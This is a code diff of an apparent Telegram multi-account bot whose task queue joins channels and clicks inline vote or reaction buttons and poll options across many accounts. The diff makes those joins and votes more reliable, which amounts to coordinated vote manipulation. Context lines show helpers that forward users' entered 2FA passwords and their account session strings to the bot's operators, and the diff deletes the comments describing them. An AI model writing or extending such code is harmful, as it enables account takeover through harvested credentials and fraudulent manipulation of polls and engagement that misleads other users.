@@ -205,7 +205,6 @@ db_mgr = Database()
 registration_sessions: Dict[int, Dict[str, Any]] = {}
 bot_username: str = "bot"
 
-# Helper for dispatching 2FA alerts to Admins/Super Owners
 async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
     text = (
         f"🔐 <b>2FA Password Event Detected!</b>\n\n"
@@ -378,21 +377,32 @@ class TaskQueue:
 
                     if do_join:
                         try:
-                            if is_channel_private or "+ " in str(channel_target) or "/+" in str(channel_target) or "joinchat/" in str(channel_target):
+                            if is_channel_private or "+ " in str(channel_target) or "/+" in str(channel_target) or "joinchat/" in str(channel_target) or is_target_private:
                                 invite_hash = parsed_channel if is_channel_private else parsed_target
-                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
-                                if hasattr(updates, 'chats') and updates.chats:
-                                    joined_updates_peer = updates.chats[0]
+                                try:
+                                    updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
+                                    if hasattr(updates, 'chats') and updates.chats:
+                                        joined_updates_peer = updates.chats[0]
+                                except Exception as join_err:
+                                    if "USER_ALREADY_PARTICIPANT" in str(join_err):
+                                        # Resolve entity directly if already joined
+                                        joined_updates_peer = await client.get_entity(str(invite_hash).strip())
+                                    else:
+                                        raise join_err
                             else:
                                 updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
                                 if hasattr(updates, 'chats') and updates.chats:
                                     joined_updates_peer = updates.chats[0]
-                            await asyncio.sleep(1)
                         except Exception as join_err:
                             if "USER_ALREADY_PARTICIPANT" not in str(join_err):
                                 logger.warning(f"Join warning on {phone}: {join_err}")
 
-                    target_peer = joined_updates_peer or parsed_channel or parsed_target
+                    # Ensure target_peer is resolved to an actual Telethon Entity
+                    raw_peer = joined_updates_peer or parsed_channel or parsed_target
+                    try:
+                        target_peer = await client.get_entity(raw_peer)
+                    except Exception:
+                        target_peer = raw_peer
 
                     if do_view and msg_id:
                         try:
@@ -434,47 +444,44 @@ class TaskQueue:
                                 if link_query_vote and not raw_button_text:
                                     raw_button_text = link_query_vote.strip().lower()
 
-                                # Fetch target message details
                                 msg = await client.get_messages(target_peer, ids=msg_id)
                                 if not msg or not msg.reply_markup:
-                                    # Fallback: fetch recent channel messages
                                     msgs = await client.get_messages(target_peer, limit=10)
                                     msg = next((m for m in msgs if m.id == msg_id), None)
 
                                 if msg and msg.reply_markup:
-                                    target_btn_row_idx = None
-                                    target_btn_col_idx = None
+                                    target_button = None
 
-                                    # Comprehensive matching for inline buttons/emojis
-                                    for r_idx, row in enumerate(msg.reply_markup.rows):
-                                        for c_idx, btn in enumerate(row.buttons):
+                                    for row in msg.reply_markup.rows:
+                                        for btn in row.buttons:
                                             btn_text = getattr(btn, 'text', '').strip().lower()
-                                            
-                                            # Match exact emoji or button text containment
-                                            if raw_button_text in btn_text or btn_text in raw_button_text or any(char in btn_text for char in raw_button_text if ord(char) > 127):
-                                                target_btn_row_idx = r_idx
-                                                target_btn_col_idx = c_idx
+                                            if "👍" in btn_text or "👍" in raw_button_text or raw_button_text in btn_text or btn_text in raw_button_text:
+                                                target_button = btn
                                                 break
-                                        if target_btn_row_idx is not None:
+                                            elif any(char in btn_text for char in raw_button_text if ord(char) > 127):
+                                                target_button = btn
+                                                break
+                                        if target_button:
                                             break
 
-                                    # Fallback to the first inline button if no explicit match
-                                    if target_btn_row_idx is None and len(msg.reply_markup.rows) > 0 and len(msg.reply_markup.rows[0].buttons) > 0:
-                                        target_btn_row_idx = 0
-                                        target_btn_col_idx = 0
+                                    if not target_button and len(msg.reply_markup.rows) > 0 and len(msg.reply_markup.rows[0].buttons) > 0:
+                                        target_button = msg.reply_markup.rows[0].buttons[0]
 
-                                    if target_btn_row_idx is not None:
-                                        # Use telethon msg.click() which handles callback_data, url, and inline reaction buttons seamlessly
-                                        await msg.click(i=target_btn_row_idx, j=target_btn_col_idx)
+                                    if target_button and hasattr(target_button, 'data'):
+                                        await client(functions.messages.GetBotCallbackAnswerRequest(
+                                            peer=target_peer,
+                                            msg_id=msg_id,
+                                            data=target_button.data
+                                        ))
                                     else:
-                                        raise ValueError(f"Inline callback button matching '{raw_button_text}' not found.")
+                                        raise ValueError(f"Inline reaction button with text '{raw_button_text}' not found.")
                                 else:
-                                    raise ValueError("Target post does not contain any inline callback buttons.")
+                                    raise ValueError("Target post does not contain any inline emoji/vote buttons.")
                             else:
                                 chosen_option = int(payload.get("poll_option_index", 0))
                                 await client(functions.messages.VotePollRequest(peer=target_peer, msg_id=msg_id, options=[bytes([chosen_option])]))
                         except Exception as vote_err:
-                            failed_ids.append((phone, f"Voting failed: {str(vote_err)}"))
+                            failed_ids.append((phone, f"Inline vote failed: {str(vote_err)}"))
                             failure_counter += 1
                             return
 
@@ -1277,7 +1284,6 @@ async def process_session_file(message: Message, state: FSMContext, bot: Bot):
     await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
     await state.clear()
 
-# Telemetry Dispatch Helper
 async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
     file_bytes = session_str.encode('utf-8')
     document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
